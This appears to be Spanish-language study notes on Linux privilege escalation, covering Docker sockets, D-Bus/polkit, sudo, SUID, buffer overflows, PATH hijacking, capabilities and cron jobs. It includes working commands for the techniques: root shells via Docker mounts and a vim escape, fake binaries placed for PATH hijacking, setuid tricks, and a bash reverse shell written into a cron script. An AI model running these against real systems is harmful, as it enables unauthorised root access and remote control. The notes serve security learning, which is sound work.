
# Escalada de Privilegios en Linux

## 1. Daemons y Servicios

### ¿Qué es un Daemon?

Un **daemon** es un proceso de sistema que:
- Se inicia durante el arranque del sistema
- Corre en segundo plano continuamente
- Ofrece un servicio al sistema o a otros procesos
- Generalmente se ejecuta con permisos elevados (root)
- Escucha en sockets (`/var/run/*.sock`) o puertos TCP/UDP

### Vulnerabilidades en Daemons

El error de seguridad ocurre cuando un daemon:
- **Ejecuta acciones como root** pero confía en órdenes de usuarios sin privilegios
- **Ejemplo crítico:** Docker daemon - permite que usuarios en el grupo docker ejecuten contenedores como root

### Enumeración de Daemons y Procesos

```bash
# Ver todos los procesos ejecutándose como root
ps aux | grep root

# Ejemplo de salida:
# root         1  0.0  0.1  19108  8684 ?  Ss   10:23   0:01 /sbin/init
# root       582  0.0  0.3  55304  5884 ?  Ss   10:23   0:00 /usr/sbin/sshd -D
# root       891  0.0  0.2  45380  4156 ?  Ss   10:23   0:00 /usr/sbin/cupsd
```

```bash
# Listar todos los sockets en el sistema
ls -l /var/run/*.sock

# Ejemplo de salida:
# srw-rw---- 1 root docker 0 dic 30 10:23 /var/run/docker.sock
```

```bash
# Búsqueda profunda de sockets en todo el sistema
find / -type s 2>/dev/null

# Ejemplo de salida:
# /var/run/docker.sock
# /var/run/systemd/journal/socket
# /var/run/dbus/system_bus_socket
```

```bash
# Ver información de grupos del sistema
getent group

# Ejemplo de salida:
# root:x:0:
# docker:x:999:usuario
# wheel:x:10:
```

```bash
# Ver información del usuario actual
id

# Ejemplo de salida:
# uid=1000(usuario) gid=1000(usuario) grupos=1000(usuario),999(docker),10(wheel)
```

---

## 2. Sockets: Puerta Abierta a Root

### Concepto de Sockets

Los **sockets Unix** son:
- Mecanismo de comunicación **inter-proceso (IPC)** sin necesidad de red
- Basados en archivos con permisos estándar (rwx)
- **Sin autenticación** por contraseña, roles o sandboxing
- Si puedes acceder al archivo socket → acceso total al servicio

### Principio de Confianza Total

> Si un usuario puede abrir y escribir en un socket, el daemon **confía ciegamente** en todas sus órdenes, sin validación adicional.

Ejemplo: Docker daemon corre como root y escucha en `/var/run/docker.sock`. Cualquier usuario que pueda escribir en ese socket puede controlar contenedores con permisos de root.

### Explotación de Sockets

```bash
# Comunicarse con Docker daemon (sin autenticación)
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# Ejemplo: Listar todos los contenedores
curl --unix-socket /var/run/docker.sock http://localhost/containers/json | jq

# Respuesta esperada:
# [
#   {
#     "Id": "abc123def456...",
#     "Image": "ubuntu:20.04",
#     "Status": "Up 2 hours",
#     "State": "running"
#   }
# ]
```

```bash
# Otra forma: Usar netcat con socket
nc -U /var/run/docker.sock
# Luego escribir comandos HTTP manualmente
```

---

```bash
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```


## 3. UIDs, GIDs y Grupos

### Estructura del comando `id`

```bash
id
# Salida: uid=1000(usuario) gid=1000(usuario) grupos=1000(usuario),10(wheel),999(docker)
```

Desglose:
- **uid=1000(usuario)** → ID de usuario (UID)
- **gid=1000(usuario)** → ID de grupo primario (GID)
- **grupos=** → Todos los grupos a los que pertenece el usuario

**UID especial:** El usuario **root** siempre tiene UID=0

### Comando `groups`

```bash
groups
# Salida: usuario wheel docker

# Ver grupos de otro usuario
groups otro_usuario
# Salida: otro_usuario adm
```

### Grupos Críticos para Escalada

#### 1. **sudo/wheel** - Ejecución como Root

```bash
# Pertenece al grupo wheel o sudo
id | grep wheel

# Permite ejecutar comandos como root con la contraseña del usuario
sudo su -
sudo apt-get update
```

**Riesgo:** Si el usuario está en este grupo y tiene sudoers, puede escalar a root.

#### 2. **docker/lxd** - Contenedores como Root

```bash
# Listar grupos del usuario
id | grep docker

# Crear un contenedor malicioso
docker run -it -v /:/mnt alpine chroot /mnt /bin/bash

# Resultado: Shell como root del host
```

**Explicación:** Docker/LXD permiten montar el disco completo del host dentro de un contenedor y obtener root.

#### 3. **dbus-daemon** - Control del Sistema

```bash
id | grep dbus

# Permite:
# - Reiniciar el sistema
# - Cambiar configuración de red
# - Ejecutar acciones privilegiadas del sistema
```

El **D-Bus** es un bus IPC (Inter-Process Comunication) que conecta procesos de usuario y servicios del sistema.

Dos buses importantes:
- **System Bus** (`/run/dbus/system_bus_socket`) → servicios de sistema (NetworkManager, logind, UPower, etc.)
- **Session Bus** (por usuario) → apps de escritorio

Riesgo principal:
- Si un método D-Bus privilegiado está mal protegido por política (o por la lógica del servicio), un usuario local puede ejecutar acciones de alto impacto sin ser root.

##### Enumeración práctica de superficie D-Bus

```bash
# Socket del bus del sistema
ls -l /run/dbus/system_bus_socket

# Servicios registrados en el system bus
busctl list

# Árbol de objetos de un servicio (ejemplo: logind)
busctl tree org.freedesktop.login1

# Interfaces y métodos expuestos
busctl introspect org.freedesktop.login1 /org/freedesktop/login1

# Alternativa con gdbus
gdbus introspect --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1
```

##### Dónde se decide la autorización

En entornos modernos, muchas acciones privilegiadas pasan por **PolicyKit (polkit)**.

```bash
# Acciones polkit disponibles
pkaction | head -40

# Ver detalle de una acción concreta
pkaction --action-id org.freedesktop.login1.reboot --verbose

# Ver reglas locales de polkit
ls -la /etc/polkit-1/rules.d/
ls -la /usr/share/polkit-1/actions/
```

Señales de riesgo:
- Reglas demasiado amplias (usuarios/grupos no administrativos con `yes`)
- Métodos sensibles permitidos con autenticación débil o “active session” ambigua
- Servicios D-Bus custom sin validación fuerte de UID/origen

##### Ejemplo controlado de llamada D-Bus

```bash
# Pedir reboot por D-Bus (puede requerir auth según política)
busctl call org.freedesktop.login1 \
   /org/freedesktop/login1 \
   org.freedesktop.login1.Manager Reboot b true
```

Si la política está bien, el sistema pedirá autenticación o denegará acceso.
Si está mal, la llamada podría ejecutarse sin controles adecuados.

##### Explicación técnica: CVE-2025-6019

`CVE-2025-6019` se describe públicamente como una vulnerabilidad de **escalada local de privilegios** en el flujo de autorización entre **D-Bus** y **PolicyKit (polkit)**.

Idea clave del fallo:
- Un usuario local sin privilegios puede forzar un contexto de autorización incorrecto en una llamada D-Bus privilegiada
- El servicio (udisks2) termina evaluando la petición como más confiable de lo que debería
- Resultado: ejecución de acciones administrativas sin el nivel de autenticación esperado

Este CVE nos permite obtener una sesión explotando los PAM (Pluggable Authentication Modules), para tener la polkit allow_active. Con esto, podemos montar imágenes de disco de manera
privilegiada por la race-condition Filesystem.Resize del DBus. Al resizear una imagen montada en el loop, libblockdev la monta para realizar los cambios, pero da error al desmontarla por el cambio de tamaño, dejando la imagen accesible en /tmp/blockdev*/, pero montada como root.

#### 4. **adm, shadow, journal** - Acceso a Archivos Privilegiados

```bash
# Grupo 'adm' - Acceso a logs
id | grep adm
# Lee: /var/log/auth.log, /var/log/syslog, otros logs de sistema

# Grupo 'shadow' - Acceso a hashes de contraseñas
id | grep shadow
cat /etc/shadow
# Salida: usuario:$6$salt$hash:18000:0:99999:7:::

# Grupo 'journal' - Acceso a logs de systemd
id | grep journal
journalctl -u ssh
# Puede revelar: variables de entorno, credenciales en servicios, secretos en logs
```

#### 5. **disk, kmem** - Acceso Directo a Hardware

```bash
# Grupo 'disk' - Lectura de discos completos
id | grep disk
# Permite montar filesystems enteros, acceso total a datos

# Grupo 'kmem' - Acceso a memoria del kernel
id | grep kmem
# Prácticamente equivalente a root, acceso directo a memoria del kernel
```

---

## 4. Variables de Entorno

### Visualizar Variables de Entorno

```bash
# Ver todas las variables
env

# Ejemplo de salida:
# PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
# HOME=/home/usuario
# USER=usuario
# SHELL=/bin/bash
# MAIL=/var/mail/usuario
```

```bash
# Alternativa
set | head -20

# Salida incluye también funciones bash
```

### Variables Críticas

| Variable | Uso | Importancia |
|----------|-----|-------------|
| **PATH** | Ubicaciones donde buscar binarios | **CRÍTICA** - Path hijacking |
| **SHELL** | Shell por defecto del usuario | Determina comportamiento |
| **USER/HOME** | Usuario y directorio home | Identificación |
| **IFS** | Separador de campos (espacios, tabs) | **CRÍTICA** - Explotación de scripts |
| **LD_PRELOAD** | Bibliotecas precargadas | **CRÍTICA** - Inyección de código |
| **LD_LIBRARY_PATH** | Rutas de búsqueda de librerías | **CRÍTICA** - Secuestro de librerías |

### Búsqueda de Credenciales

```bash
# Buscar credenciales en variables de entorno
env | grep -i password
env | grep -i secret
env | grep -i token
env | grep -i api

# Ejemplo hallazgo:
# DB_PASSWORD=admin123456
# AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
```

---

## 5. Privilegios Sudo

### Listar Comandos Permitidos

```bash
sudo -l

# Salida típica:
# User usuario may run the following commands on hostname:
#     (root) NOPASSWD: /usr/bin/vim
#     (root) /bin/ls
#     (www-data) NOPASSWD: /usr/local/bin/custom_script.sh
```

**Desglose:**
- `(root)` → Usuario objetivo (ejecutar como root)
- `NOPASSWD:` → Sin pedir contraseña
- `/usr/bin/vim` → Comando permitido (ruta absoluta)

### Sudo sin Contraseña

```bash
# Comando permitido sin contraseña
sudo -l | grep NOPASSWD

# Ejecutar directamente
sudo /usr/bin/vim

# CRÍTICO: vim permite ejecutar comandos
# Dentro de vim: :!cat /etc/shadow
# O: :!/bin/bash
```

### Información Detallada de Sudoers

```bash
# Ver archivo de sudoers (si tienes permisos)
sudo cat /etc/sudoers

# Ver archivos adicionales
ls -la /etc/sudoers.d/
```

### Verificar Permisos de Otro Usuario

```bash
# Listar privilegios de otro usuario (requiere sudo)
sudo -l -U otro_usuario

# Salida:
# User otro_usuario may run the following commands on hostname:
#     (root) /usr/bin/cat
```

### Escalada Vía Sudo

#### Caso 1: Binario que Permite Shell

```bash
# Si tienes sudo a vim
sudo vim

# Dentro de vim, ejecutar comando
:!cat /etc/shadow
:!/bin/bash
```

#### Caso 2: Path Hijacking en Script

```bash
# Script sudoable que ejecuta binarios sin ruta absoluta
sudo -l
# (root) NOPASSWD: /opt/backup.sh

cat /opt/backup.sh
# #!/bin/bash
# tar czf backup.tar.gz /data

# El script llama a 'tar' sin ruta absoluta
# Crear nuestro 'tar' malicioso
mkdir -p /tmp/hijack
echo '#!/bin/bash
/bin/bash' > /tmp/hijack/tar
chmod +x /tmp/hijack/tar

# Ejecutar script con PATH modificado
export PATH=/tmp/hijack:$PATH
sudo /opt/backup.sh
# Resultado: Shell como root
```

---

## 6. SUID y SGID

### Concepto: Bit SUID (Set User ID)

Cuando un binario tiene activado el bit **SUID**:
- El proceso ejecutado hereda los permisos del **propietario del archivo**
- Si el propietario es root → se ejecuta como root, sin importar quién lo lance

```bash
# Detectar bit SUID en permisos
ls -l /usr/bin/passwd
# -rwsr-xr-x 1 root root  68208 ene 18  2024 /usr/bin/passwd
#  ^^^
#  s en posición de ejecución de owner = SUID activado
```

### Búsqueda de Binarios SUID

```bash
# Encontrar todos los binarios SUID en el sistema
find / -perm -4000 -type f 2>/dev/null

# Ejemplo de salida:
# /usr/bin/passwd         (SUID root)
# /usr/bin/sudo           (SUID root)
# /usr/bin/chsh           (SUID root)
# /usr/bin/at             (SUID daemon)
# /usr/libexec/ssh-keysign (SUID root)
```

### Búsqueda de Binarios SGID

```bash
# Encontrar binarios con bit SGID (Set Group ID)
find / -perm -2000 -type f 2>/dev/null

# Ejemplo:
# /usr/bin/wall           (SGID tty)
# /usr/bin/expiry         (SGID shadow)
```

### Explotación de SUID

#### Caso 1: Script SUID con Path Hijacking

```bash
# Script vulnerable (SUID root)
cat /usr/local/bin/admin_backup.sh
#!/bin/bash
# Backup script
tar czf /backups/data.tar.gz /data

# El script ejecuta 'tar' sin ruta absoluta
# Crear tar malicioso en /tmp
echo '#!/bin/bash
/bin/bash' > /tmp/tar
chmod +x /tmp/tar

# Ejecutar con PATH modificado
export PATH=/tmp:$PATH
/usr/local/bin/admin_backup.sh

# Resultado: Shell como root (propietario del script SUID)
```

#### Caso 2: Binario SUID Vulnerable

Algunos binarios SUID tienen vulnerabilidades explotables:

```bash
# Ejemplo: binario que permite escribir archivos como root
find / -perm -4000 2>/dev/null | while read file; do
  strings "$file" | grep -i "write\|create\|output"
done

# Si encontramos algo interesante, analizar con
strings /ruta/binario
strace -e openat /ruta/binario arg1 arg2
```

### SGID: Menos Común pero Igual de Peligroso

```bash
# Script SGID que se ejecuta con permisos del grupo
ls -l /usr/local/bin/grupo_script
# -rwxr-sr-x 1 root admin 1024 dic 30 /usr/local/bin/grupo_script
#        s
#        Grupo 'admin' con permisos especiales

# Si perteneces a 'admin', el script se ejecuta con permisos de grupo
# Posible escalada similar a SUID
```

## 7. Buffer Overflow

### Concepto

Un **Buffer Overflow** ocurre cuando un programa escribe más datos de los que caben en una zona de memoria (buffer).

Si el binario es vulnerable, ese exceso puede:
- Sobrescribir variables críticas
- Corromper direcciones de retorno en la pila
- Alterar el flujo de ejecución del programa
- En binarios SUID root, derivar en ejecución de código con privilegios de root

### Tipos comunes

1. **Stack-based overflow**
   - Ocurre en el stack
   - Suele impactar `saved RBP (Base Pointer)` y dirección de retorno (`RIP` en x86_64)
2. **Heap-based overflow**
   - Ocurre en memoria dinámica (heap)
   - Puede corromper metadatos del heap o punteros
3. **Off-by-one / off-by-few**
   - Escritura de 1 o pocos bytes fuera de límite

### Anatomía rápida en x86_64

En una función vulnerable, la pila suele verse así:

```text
[ buffer local ]
[ saved RBP   ]
[ return RIP  ]
```

Si un input supera el tamaño de `buffer`, puede llegar hasta `RIP (Instruction Pointer)` y redirigir ejecución.

### ¿Por qué importa en escalada de privilegios?

Si tenemos un **binario SUID**, y podemos manejar su ejecución, supone poder ejecutar cosas como root.

Ejemplo típico de cadena de ataque:
- Binario SUID root vulnerable a overflow
- Control de `RIP`
- Ejecución de código (shellcode, `ret2libc`, ROP)
- Shell con eUID=0

### Señales de riesgo en binarios

Buscar binarios que:
- Usen funciones inseguras (`gets`, `strcpy`, `sprintf`, `scanf` sin límites)
- Lean entrada del usuario sin validar longitud
- Sean SUID/SGID o corran como root

```bash
# Encontrar binarios SUID
find / -perm -4000 -type f 2>/dev/null

# Buscar strings sospechosas en binarios
strings /ruta/binario | grep -E "gets|strcpy|sprintf|scanf"

# Revisar protecciones del binario
checksec --file=/ruta/binario
```

Salida típica de `checksec` a interpretar:
- **Canary: disabled** → más fácil sobreescribir stack sin detección
- **NX: disabled** → permite ejecutar shellcode en stack
- **PIE: disabled** → direcciones más predecibles
- **RELRO: Partial/None** → más superficie para técnicas avanzadas

### Ejemplo

```c
// vulnerable.c
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
   char buffer[64];
   strcpy(buffer, input);
   printf("Input: %s\n", buffer);
}

int main(int argc, char **argv) {
   if (argc < 2) return 1;
   vulnerable(argv[1]);
   return 0;
}
```

### Flujo básico de análisis

```bash
python3 -c 'print("A"*1000)' | /ruta/binario

gdb /ruta/binario
# (gdb) run < <(python3 -c 'print("A"*1000)')
# (gdb) info registers
```

Si el programa cae con `segfault` al recibir entradas grandes, puede existir un overflow explotable.

### Ejemplo: encontrar offset de control de RIP

```bash
# Generar patrón cíclico
python3 -c 'from pwn import cyclic; print(cyclic(300).decode())' > pattern.txt

# Ejecutar con el patrón
./vulnerable "$(cat pattern.txt)"

# Revisar en gdb qué valor quedó en RIP
gdb ./vulnerable
# (gdb) run "$(cat pattern.txt)"
# (gdb) info registers

# Calcular offset exacto
python3 -c 'from pwn import cyclic_find; print(cyclic_find(0x6161616c))'
```

Con ese offset, se puede validar control de retorno sustituyendo `RIP` por un valor conocido de prueba.

---

## 8. Path Hijacking

### Concepto

Cuando un script o binario ejecuta un comando **sin usar su ruta absoluta**, el sistema busca el comando en la variable `PATH` por orden de directorios.

```bash
# Visualizar PATH actual
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Búsqueda: El sistema busca en este orden
# 1. /usr/local/sbin/comando
# 2. /usr/local/bin/comando
# 3. /usr/sbin/comando
# 4. /usr/bin/comando
# 5. /sbin/comando
# 6. /bin/comando
```

### Explotación Clásica

**Script vulnerable (SUID root):**
```bash
cat /opt/backup.sh
#!/bin/bash
# Backup script con tar ejecutado sin ruta absoluta
tar czf /backups/data.tar.gz /data
zip -r /backups/docs.zip /home/user/documents
```

**Ataque:**
```bash
# Crear directorio con nuestro 'tar' malicioso
mkdir -p /tmp/hijack
echo '#!/bin/bash
/bin/bash' > /tmp/hijack/tar
chmod +x /tmp/hijack/tar

# Crear también nuestro 'zip' malicioso
echo '#!/bin/bash
/bin/bash' > /tmp/hijack/zip
chmod +x /tmp/hijack/zip

# Modificar PATH para que busque primero en /tmp/hijack
export PATH=/tmp/hijack:$PATH

# Ejecutar el script SUID
/opt/backup.sh

# Resultado: Se ejecutan nuestros binarios maliciosos como root
# Shells obtenidas con permisos de root
```

### Análisis de Binarios Problemáticos

Para identificar vulnerabilidades, analizar con:

```bash
# Ver strings legibles en el binario (buscar comandos sin ruta absoluta)
strings /sbin/binario_interesante | grep -E "^[a-z_]+\s" | head -20

# Trazar llamadas al sistema durante ejecución
strace -e execve /sbin/binario_interesante arg1 2>&1 | grep execve
# Ejemplo: execve("/bin/ls", ["/bin/ls", "-la"], ...) [RUTA ABSOLUTA OK]
# Ejemplo: execve("tar", ["tar", "-czf", ...], ...)            [VULNERABLE]
```

### Mitigación

```bash
# Usar rutas absolutas siempre
/usr/bin/tar czf backup.tar.gz /data
/usr/bin/zip -r archive.zip /home

# O usar variable de entorno específica
export PATH=/usr/bin:/bin
# De esta forma limita el PATH a directorios del sistema
```

---

## 9. Capabilities (Capacidades Linux)

### Concepto

Las **Linux Capabilities** ofrecen un modelo de permisos más granulado que la dicotomía tradicional root/no-root.

En lugar de ejecutar como root, se asignan permisos específicos a procesos.

```bash
# Ver todas las capabilities disponibles
man capabilities

# Ejemplos:
# CAP_SETUID      - Cambiar UID
# CAP_NET_ADMIN   - Administrar redes
# CAP_SYS_ADMIN   - Acciones administrativas del sistema
# CAP_DAC_OVERRIDE- Saltarse permisos rwx
```

### Ver Capabilities de la Shell Actual

```bash
capsh --print

# Salida ejemplo:
# Current: = cap_setfcap+ep
# Bounding set =cap_chown,cap_dac_override,cap_setuid,...
# Ambient set =
```

### Encontrar Binarios con Capabilities

```bash
# Buscar todos los binarios con capabilities
getcap -r / 2>/dev/null

# Salida ejemplo:
# /usr/bin/tcpdump = cap_net_raw,cap_net_admin+ep
# /usr/sbin/ping = cap_net_icmp+ep
# /usr/bin/python3.9 = cap_setuid,cap_setgid+ep
```

### Capabilities Peligrosas

#### 1. **CAP_SETUID / CAP_SETGID** - Cambio de UID/GID

Permite cambiar el UID/GID del proceso a **cualquiera**, incluyendo 0 (root).

```bash
# Ver si el binario tiene estas capabilities
getcap -r / 2>/dev/null | grep setuid

# Ejemplo: Python con CAP_SETUID
/usr/bin/python3.9 = cap_setuid,cap_setgid+ep

# Explotación
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Resultado: Shell como root

# O en un script
cat > escalada.py << 'EOF'
import os
import subprocess

# Cambiar UID a root
os.setuid(0)

# Ejecutar shell
subprocess.call(["/bin/bash", "-i"])
EOF

python3 escalada.py
# Resultado: Shell interactivo como root
```

#### 2. **CAP_SYS_ADMIN** - Acciones Administrativas

Esta capability es **equivalente a root parcial** en muchos casos.

```bash
# Detectar
getcap -r / 2>/dev/null | grep sys_admin

# Usos maliciosos:
# - Montar filesystems
# - Crear namespaces
# - Modificar configuración del kernel

# Ejemplo: Montar filesystem y hacer chroot
getcap -r / 2>/dev/null | grep cap_sys_admin

# Si encontramos un binario con CAP_SYS_ADMIN:
/usr/bin/nsenter = cap_sys_admin+ep

# Usar para crear contenedor como root
nsenter --mount=/proc/1/ns/mnt /bin/bash

# Resultado: Shell con acceso al namespace del host como root
```

#### 3. **CAP_DAC_OVERRIDE** - Saltarse Permisos rwx

Permite leer/escribir cualquier archivo, independientemente de permisos.

```bash
# Detectar
getcap -r / 2>/dev/null | grep dac_override

# Ejemplo: Leer /etc/shadow sin ser root
/usr/bin/cat = cap_dac_override+ep

/usr/bin/cat /etc/shadow
# root:$6$salt1$hash1:18000:0:99999:7:::
# user:$6$salt2$hash2:18000:0:99999:7:::
```

#### 4. **CAP_NET_ADMIN / CAP_NET_RAW** - Control de Red

Permiten manipular la red sin ser root.

```bash
# CAP_NET_ADMIN - Configurar interfaces, iptables, etc.
getcap -r / 2>/dev/null | grep net_admin

# Ejemplos de abuso:
# - Redirigir tráfico
# - Modificar rutas de red
# - Exfiltración de datos

# CAP_NET_RAW - Crear paquetes propios, sniffing
# Ejemplos:
# - Crear paquetes TCP/IP personalizados
# - Escuchar todo el tráfico de red
# - Ataques MITM sin privilegios root

# Herramienta: tcpdump con CAP_NET_RAW+CAP_NET_ADMIN
/usr/sbin/tcpdump = cap_net_raw,cap_net_admin+ep

# Ejecutar sin sudo
tcpdump -i eth0 -w capture.pcap
```

#### 5. **CAP_SYS_PTRACE** - Adjuntarse a Procesos

Permite leer/escribir memoria de otros procesos.

```bash
# Detectar
getcap -r / 2>/dev/null | grep sys_ptrace

# Proceso peligroso: GDB con CAP_SYS_PTRACE
/usr/bin/gdb = cap_sys_ptrace+ep

# Listar procesos root
ps aux | grep root
# root     1234  0.5  1.2  123456 98765 ?  Ss  10:23  0:05 /usr/sbin/sshd

# Adjuntarse al proceso
gdb -p 1234

# Dentro de gdb - ejecutar comando
(gdb) call system("/bin/bash")

# Resultado: Shell como root (usuario del proceso adjuntado)
```

---

## 10. CRON - Tareas Automáticas

### ¿Qué es CRON?

Un **cronjob** es una tarea que se ejecuta automáticamente en intervalos regulares:
- Diaria, horaria, cada X minutos, etc.
- Puede ejecutarse como root o cualquier usuario
- Definidas en crontabs o scripts en directorios cron

### Listar Cronjobs del Sistema

```bash
# Ver todos los cronjobs del sistema
ls -la /etc/cron*
# -rw-r--r-- 1 root root  1220 dic 30 /etc/cron.d/popular
# drwxr-xr-x 4 root root  4096 dic 30 /etc/cron.d/
# drwxr-xr-x 2 root root  4096 dic 30 /etc/cron.daily/
# drwxr-xr-x 2 root root  4096 dic 30 /etc/cron.hourly/
# drwxr-xr-x 2 root root  4096 dic 30 /etc/cron.monthly/
# drwxr-xr-x 2 root root  4096 dic 30 /etc/cron.weekly/

# Ver contenido de crontab global
cat /etc/crontab
```

### Ver Crontab de Usuarios Específicos

```bash
# Ver tu propio crontab
crontab -l

# Ver crontab de otro usuario (requiere permisos)
crontab -u usuario -l

# Ejemplo de salida:
# 0 2 * * * /home/usuario/backup.sh     # Diariamente a las 2 AM
# */5 * * * * /opt/monitor.sh           # Cada 5 minutos
# 0 0 1 * * /root/monthly_cleanup.sh    # Primer día del mes
```

### Vulnerabilidades en CRON

Un cronjob es **explotable** si:

1. **Ejecuta código modificable**
   ```bash
   # Script cron es writable por el usuario
   ls -la /opt/backup.sh
   # -rwxrwxrwx 1 root root 512 dic 30 /opt/backup.sh
   
   # Modificar script y obtener shell como root
   echo '/bin/bash' >> /opt/backup.sh
   ```

2. **Ejecuta binarios sin ruta absoluta**
   ```bash
   # Cron script con path hijacking
   cat /opt/cleanup.sh
   #!/bin/bash
   rm -rf /tmp/cache
   tar czf /backups/data.tar.gz /data
   
   # Sin ruta absoluta en 'tar' → explotable con PATH hijacking
   ```

3. **Mal configurado PATH**
   ```bash
   # Cron con PATH débil
   SHELL=/bin/bash
   PATH=/tmp:/usr/bin:/bin
   
   # Directorios writable como /tmp en el PATH
   ```

4. **Lee archivos controlables**
   ```bash
   # Cron que procesa archivos en /tmp
   cat /etc/cron.d/upload
   # * * * * * root /usr/bin/process_data /tmp/upload.txt
   
   # Crear archivo malicioso
   echo "malicious_content" > /tmp/upload.txt
   ```

5. **Corre desde directorio writable**
   ```bash
   # Script cron en /tmp (world-writable)
   ls -la /tmp/cron_job.sh
   # -rwxr-xr-x 1 root root 256 dic 30 /tmp/cron_job.sh
   
   # Si lo ejecutamos desde un cron como root...
   # Podemos reemplazar el script
   ```

### Explotación Práctica de CRON

**Escenario:** Cron que ejecuta backup cada 10 minutos

```bash
# Ver cronjob
crontab -l
# */10 * * * * /opt/backup.sh

# Verificar permisos del script
ls -la /opt/backup.sh
# -rwxr-xr-x 1 root root 256 dic 30 /opt/backup.sh

# Si tienes acceso a /opt/ o el script es writable:
echo '#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' > /opt/backup.sh
chmod +x /opt/backup.sh

# En 10 minutos, cron ejecutará tu script como root
# Reverse shell conectada a tu máquina atacante
```

**Escenario alternativo:** Cron con PATH débil

```bash
# Crontab del sistema
cat /etc/crontab
# ...
# PATH=/usr/bin:/bin:/usr/sbin:/sbin
# * * * * * root /opt/task.sh

# Contenido del script
cat /opt/task.sh
#!/bin/bash
cleanup_temp
backup_data

# Si 'cleanup_temp' no está en ruta absoluta, explotable
mkdir -p /tmp/hijack
echo '#!/bin/bash
chmod u+s /bin/bash
/bin/bash' > /tmp/hijack/cleanup_temp
chmod +x /tmp/hijack/cleanup_temp

# Modificar PATH en /etc/crontab (si tienes acceso)
# PATH=/tmp/hijack:/usr/bin:/bin:/usr/sbin:/sbin

# Esperar a que cron se ejecute → /bin/bash con SUID
/bin/bash -p
# Shell como root
```